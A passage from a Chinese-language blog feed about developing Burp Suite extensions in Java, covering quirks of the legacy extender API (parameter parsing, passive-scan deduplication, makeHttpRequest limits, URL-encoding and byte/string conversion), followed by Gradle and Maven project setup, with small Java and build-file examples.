class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">0</span><br>url<br>http:%<span class="hljs-number">2f</span>%<span class="hljs-number">2f</span><br>---------------------<br><span class="hljs-number">6</span><br>username<br>admin<br>---------------------<br><span class="hljs-number">6</span><br>remember<br><span class="hljs-number">1</span><br>---------------------<br></code></pre></div></td></tr></table></figure><p>上方的query参数<code>/?url=http:%2f%2f</code>，拿到的值是<code>http:%2f%2f</code>，burp没有对其进行解码，在数据包里什么样就是什么样。</p><p>对于JSON参数 <code>&#123;&quot;usernmae&quot;: &quot;admin&quot;, &quot;rememberme&quot;: 1&#125;</code>的<code>&quot;admin&quot;</code>和<code>1</code>参数值，<code>getValue()</code>返回值分别是<code>admin</code>和<code>1</code>，并不能从值去判断该JSON参数是字符串还是数字，可以使用<code>request[parameter.getValueStart()-1] == &#39;&quot;&#39;</code> 来判断。</p><h2 id="IScannerCheck"><a href="#IScannerCheck" class="headerlink" title="IScannerCheck"></a>IScannerCheck</h2><p>通过 <code>IBurpExtenderCallbacks</code>对象的<code>registerScannerCheck(IScannerCheck check)</code> 方法注册一个<code>IScannerCheck</code>对象来向burp添加自己的扫描检测。</p><p><code>IScannerCheck</code>接口的几个方法：</p><ul><li><code>int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue)</code>：当同一个URL路径报了多个issue，该方法就会被调用。若返回<code>-1</code>则只报告<code>existingIssue</code>，若返回<code>0</code>则报告这两个<code>issue</code>，若返回1则报告<code>newIssue</code>。通常返回<code>0</code>。</li><li><code>java.util.List&lt;IScanIssue&gt; doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</code>：主动扫描时被调用，需要时可在此方法里发包。 返回值为issue列表，其会被加到Burp的Dashboard的<code>Issue Activity</code>面板里。（也可以直接返回空列表，然后通过调用 <code>IBurpExtenderCallbacks.addScanIssue(IScanIssue issue)</code> 方法添加<code>issue</code>）</li><li><code>java.util.List&lt;IScanIssue&gt; doPassiveScan(IHttpRequestResponse baseRequestResponse)</code>：被动检测时被调用，返回值为issue列表，其会被加到Burp的Dashboard的<code>Issue Activity</code>面板里。</li></ul><p>调用burp主动扫描的一种方式是在请求项上<code>右键 - Do Active Scan</code>。对于被动检测，burp默认会在<code>Dashboard</code> 的<code>Task</code>面板中建立一个<code>Audit checks - passive</code>的任务，该任务就是对<code>Proxy</code>流量进行被动检测，或者自己在请求项上<code>右键 - Do passive scan</code>。</p><p>Github上很多burp被动扫描插件会在<code>IScannerCheck</code>的 <code>doPassiveScan</code>这个回调方法上发包检测漏洞，但官方建议是在这个回调方法里不发包，仅做数据包检测（如匹配敏感信息等），所以被动扫描器跟<code>burp</code>的<code>doPassiveScan</code>被动检测的”被动“不是一个意思。</p><p>假如一个FastJson被动扫描插件在<code>doPassiveScan</code>这个回调方法里做检测，且该插件有一个是否开启FastJson扫描的配置，就会出现这样的bug：</p><ol><li>用户将浏览器流量代理到burp，且FastJson被动扫描插件为关闭状态。</li><li>用户访问 <code>https://example.com/api</code>，burp会调用<code>doPassiveScan</code>回调方法，但FastJson被动扫描插件为关闭状态，插件直接不检测。</li><li>用户开启FastJson被动扫描插件，再访问<code>https://example.com/api</code>，burp不会再调用<code>doPassiveScan</code>回调方法了，导致即使开启了FastJson被动扫描插件也不会对<code>https://example.com/api</code>扫描。</li></ol><p>原因在于，burp对于拥有相同的URL路径和参数键名的不同请求只会调用一次<code>doPassiveScan</code>。这个行为可以在 <code>Dashboard - Task - &quot;Audit check - passive&quot; - Depulication</code>配置里进行关闭。</p><p>所以如果想要实现一个burp被动扫描插件，应该监听Proxy流量，然后自行判断该请求是否扫描过，避免重复扫描。</p><h2 id="makeHttpRequest"><a href="#makeHttpRequest" class="headerlink" title="makeHttpRequest"></a>makeHttpRequest</h2><p>调用<code>IBurpExtenderCallbacks</code>的<code>makeHttpRequest</code>方法来发送http请求，有几个问题：</p><ul><li><p>该方法为同步发送请求，没有提供异步发送的方式。</p></li><li><p>该方法不跟踪跳转。（测试发现，跟burp的<code>Settings - Network - HTTP - Allowed redirect type</code>这个配置无关）</p></li><li><p>有个默认的超时时间（120秒），可在burp的<code>Settings - Network - Connections - Timeouts</code>里配置。大部分用户不会去配置，导致用<code>burp api</code>发大量请求时会比较慢。 <code>makeHttpRequest</code>方法没有设置超时时间的参数。</p></li><li><p>发生连接不上、超时等错误时也不会抛异常。只能通过返回值判断下是否发生错误：</p><ul><li><p><code>IHttpRequestResponse makeHttpRequest(IHttpService httpService, byte[] request)</code>：返回值<code>IHttpRequestResponse</code>对象的<code>getResponse()</code>方法返回 <code>null</code>或者长度为0的byte数组。</p></li><li><p><code>byte[] makeHttpRequest(java.lang.String host, int port, boolean useHttps, byte[] request)</code> ：返回值为 <code>null</code>或者长度为0的byte数组。</p><p>具体的错误信息只在 Burp 的 <code>Dashboard - Event Log</code>里可以看到。</p></li></ul></li></ul><p>如果不使用burp提供的API，而是用第三方库（如okhttp3）发送请求，需要注意：</p><ul><li>发送的请求不会被记录到<code>Logger</code>面板里。</li><li>burp里的配置不会影响到第三方库，如代理设置。</li></ul><h2 id="urlEncode-和-urlDecode"><a href="#urlEncode-和-urlDecode" class="headerlink" title="urlEncode 和 urlDecode"></a>urlEncode 和 urlDecode</h2><p><code>IExtensionHelpers</code>对象提供的URL编码和URL解码函数：</p><ul><li><code>byte[] urlDecode(byte[] data)</code></li><li><code>java.lang.String urlDecode(java.lang.String data)</code></li><li><code>byte[] urlEncode(byte[] data)</code>：不对<code>&#39;&lt;&gt;/\&quot;</code>等编码，对<code>?#@:</code>等编码，将空格转为<code>+</code>号而不是<code>%20</code>。</li><li><code>java.lang.String urlEncode(java.lang.String data)</code>：同上</li></ul><p>这几个函数并不处理编码方式。下方示例会打印乱码与错误结果：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        callbacks.printOutput(helpers.urlDecode(<span class="hljs-string">&quot;%e4%b8%ad%e6%96%87&quot;</span>)); <span class="hljs-comment">// 打印乱码。</span><br>        callbacks.printOutput(helpers.urlEncode(<span class="hljs-string">&quot;测测&quot;</span>));  <span class="hljs-comment">// 打印错误结果 &quot;KK&quot;</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果要URL解码支持中文，需调用URL解码为byte数组，再指定编码方式将byte数组转为字符串。示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br><br>        <span class="hljs-type">byte</span>[] utf8Bytes = helpers.urlDecode(<span class="hljs-string">&quot;%e4%b8%ad%e6%96%87&quot;</span>.getBytes());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">utf8String</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(utf8Bytes, StandardCharsets.UTF_8);<br>        callbacks.printOutput(utf8String);  <span class="hljs-comment">// 输出 &quot;中文&quot;</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果要对中文进行URL编码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        callbacks.printOutput(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(helpers.urlEncode(<span class="hljs-string">&quot;中+文&quot;</span>.getBytes(StandardCharsets.UTF_8))));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上方示例并没有输出期望的结果 <code>&quot;%e4%b8%ad%2b%e6%96%87&quot;</code>，而是输出 <code>&quot;中%2b文&quot;</code>。这是因为burp的<code>urlEncode</code>方法不对不可见字节（如空字节、0xe4）进行url编码。所以想要期望的效果，需要自己实现URL编码方法了。</p><h2 id="bytesToString-和-stringToBytes"><a href="#bytesToString-和-stringToBytes" class="headerlink" title="bytesToString 和 stringToBytes"></a>bytesToString 和 stringToBytes</h2><p><code>IExtensionHelpers</code>对象提供的在字节数组与字符串之间转换的方法：</p><ul><li><p><code>java.lang.String bytesToString(byte[] data)</code></p></li><li><p><code>byte[] stringToBytes(java.lang.String data)</code></p><p>这两个方法也是不考虑编码方式，直接将字符串中的各个char字符和byte之间转换。示例：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br><br>        callbacks.printOutput(helpers.bytesToString(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) <span class="hljs-number">0xe6</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x90</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x9c</span>&#125;)); <span class="hljs-comment">// 输出 乱码</span><br>        callbacks.printOutput(hexEncode(helpers.bytesToString(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) <span class="hljs-number">0xe6</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x90</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x9c</span>&#125;))); <span class="hljs-comment">// 输出 e6909c</span><br><br>        callbacks.printOutput(hexEncode(<span class="hljs-string">&quot;中&quot;</span>)); <span class="hljs-comment">// 输出 4e2d （&quot;中&quot; 的Unicode码为U+4e2d，因为Java里的字符串按Unicode编码方式存储）</span><br>        callbacks.printOutput(hexEncode(helpers.stringToBytes(<span class="hljs-string">&quot;中文&quot;</span>))); <span class="hljs-comment">// 输出 2d87 （ 这个结果怎么来的： &quot;中&quot;的Unicode码为 U+4e2d， &quot;文&quot;的Unicode码为 U+6587，各取一个字节，拼接为 2d87）</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hexEncode</span><span class="hljs-params">(String data)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">hexContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> b : data.toCharArray()) &#123;<br>            hexContent.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, (<span class="hljs-type">int</span>) b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> hexContent.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hexEncode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">hexContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : data) &#123;<br>            hexContent.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> hexContent.toString();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果考虑中文字符的编码，就不要用这两个方法，使用：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// byte数组转字符串</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) <span class="hljs-number">0xe4</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0xb8</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0xad</span>&#125;, StandardCharsets.UTF_8);<br><br><span class="hljs-comment">// 字符串转byte数组</span><br><span class="hljs-string">&quot;中文&quot;</span>.getBytes(StandardCharsets.UTF_8);<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;网上也有一些BP插件API相关的文章，本文主要就写BP插件API的一些细节，但不会覆盖到所有的API。下方是官方的API文档和示例代码链接。入门BP插件编写，主要就是看官方的几个示例代码，去编译运行，去用用，去查API文档，就差不多了。&lt;/p&gt;
&lt;p&gt;旧API：&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="Burpsuite" scheme="https://ovi3.github.io/tags/Burpsuite/"/>
    
    <category term="Web安全" scheme="https://ovi3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="Java" scheme="https://ovi3.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite Java插件开发 - 基础篇</title>
    <link href="https://ovi3.github.io/2024/01/18/burpsuite-java-extension-code-env/"/>
    <id>https://ovi3.github.io/2024/01/18/burpsuite-java-extension-code-env/</id>
    <published>2024-01-17T16:06:00.000Z</published>
    <updated>2024-07-21T05:46:47.610Z</updated>
    
    <content type="html"><![CDATA[<p>BurpSuite插件可以使用Java、Python或Ruby来编写，因为BurpSuite（以下简称为BP或Burp）本身是用Java写的，通常插件的开发也是用Java来编写。如果用Python编写，还要安装Jython，而且在安装一些Python模块时可能会报错，加上目前Jython不支持Python 3，所以用Python写写BP小插件还行，功能多的话还是推荐用Java写。</p><p>本文主要内容是使用Java编写BP插件时，如何使用IDEA构建 Gradle 和 Maven 项目，编写一个Hello World插件，与如何调试插件。网上这类文章很多了，我主要补充一些在网上没看到的。</p><p>文中用到的BP版本为 Burpsuite Pro v2023.4.5， IDEA版本为2023.1.2。</p><h3 id="IDEA-Gradle-开发"><a href="#IDEA-Gradle-开发" class="headerlink" title="IDEA + Gradle 开发"></a>IDEA + Gradle 开发</h3><p>使用IDEA新建一个Gradle项目：</p><p><img src="burpsuite-java-extension-code-env-1.png" alt="burpsuite-java-extension-code-env-1.png"></p><p><code>Build System</code>选择<code>Gradle</code>，<code>Gradle DSL</code>选择<code>Groovy</code>。</p><p>修改<code>build.gradle</code>文件，引入编写BP插件需要的API库：</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">plugins &#123;<br>    id <span class="hljs-string">&#x27;java&#x27;</span><br>&#125;<br><br>repositories &#123;<br>    mavenCentral()<br>&#125;<br><br>sourceSets &#123;<br>    main &#123;<br>        java &#123;<br>            srcDir <span class="hljs-string">&#x27;./src/main/java&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>tasks.register(<span class="hljs-string">&#x27;fatJar&#x27;</span>, Jar) &#123;<br>    archivesBaseName = project.name + <span class="hljs-string">&#x27;-all&#x27;</span><br>    from &#123; configurations.runtimeClasspath.collect &#123; it.isDirectory() ? it : zipTree(it) &#125; &#125;<br>    with jar<br>&#125;<br><br>dependencies &#123;<br>    implementation <span class="hljs-string">&#x27;net.portswigger.burp.extender:burp-extender-api:1.7.22&#x27;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>我本机使用的是Gradle 8，如果是低版本的Gradle，由于build.gradle配置文件的语法略有不同，可能需要改一下，主要是fatJar这块要改为：</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">task fatJar(<span class="hljs-attr">type:</span> Jar) &#123;<br>    baseName = project.name + <span class="hljs-string">&#x27;-all&#x27;</span><br>    from &#123; configurations.compile.collect &#123; it.isDirectory() ? it : zipTree(it) &#125; &#125;<br>    with jar<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后<code>implementation</code> 指令改为 <code>compile</code> 。</p><p>接着在源码目录（<code>src/main/java/</code>）下新建<code>burp</code>目录，再在<code>burp</code>目录下新建一个<code>BurpExtender</code>类，再复制官方提供的HelloWorld示例 <a href="https://github.com/PortSwigger/example-hello-world/blob/master/java/BurpExtender.java">BurpExtender.java</a> 代码过来。</p><p>然后点击IDEA右侧的Gradle工具窗口 - 刷新按钮，让Gradle重新加载配置文件，下载依赖库。（如果没看到Gradle工具按钮，就点 <code>View -&gt; Tool Windows -&gt; Gradle</code> 打开）</p><p><img src="burpsuite-java-extension-code-env-2.png" alt="burpsuite-java-extension-code-env-2.png"></p><p>如果一切OK，再点击运行<code>Tasks - other - fastJar</code>，编译一个jar包出来。 这个jar包在项目根目录下的<code>build/libs</code> 目录。用BurpSuite加载这个Jar，运行你的第一个BP插件吧。</p><h3 id="IDEA-Maven-开发"><a href="#IDEA-Maven-开发" class="headerlink" title="IDEA + Maven 开发"></a>IDEA + Maven 开发</h3><p>用IDEA新建一个Maven项目</p><p><img src="burpsuite-java-extension-code-env-3.png" alt="burpsuite-java-extension-code-env-3.png"></p><p><code>Build System</code>选择<code>Maven</code>。</p><p>修改pom.xml文件为：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HelloBPMaven<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-shade-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>shade<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">addMavenDescriptor</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">addMavenDescriptor</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span 